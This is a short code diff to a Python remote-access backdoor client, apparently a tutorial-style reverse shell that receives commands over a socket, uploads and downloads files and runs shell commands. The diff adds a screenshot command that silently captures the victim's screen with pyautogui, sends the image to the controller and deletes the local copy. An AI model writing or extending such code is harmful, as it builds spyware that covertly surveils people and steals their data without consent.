@@ -2,6 +2,7 @@ import socket
 import json
 import subprocess
 import os
+import pyautogui
 
 
 def reliable_send(data):
@@ -22,6 +23,11 @@ def reliable_recv():
 def upload_file(file_name):
     f = open(file_name, 'rb')
     s.send(f.read())
+
+
+def screenshot():
+    f_screenshot = pyautogui.screenshot()
+    f_screenshot.save('screen.png')
 
 
 def download_file(file_name):
@@ -53,6 +59,10 @@ def shell():
             download_file(command[7:])
         elif command[:8] == 'download':
             upload_file(command[9:])
+        elif command[:10] == 'screenshot':
+            screenshot()
+            upload_file('screen.png')
+            os.remove('screen.png')
         else:
             if command == 'pwd':
                 if os.name == 'nt':
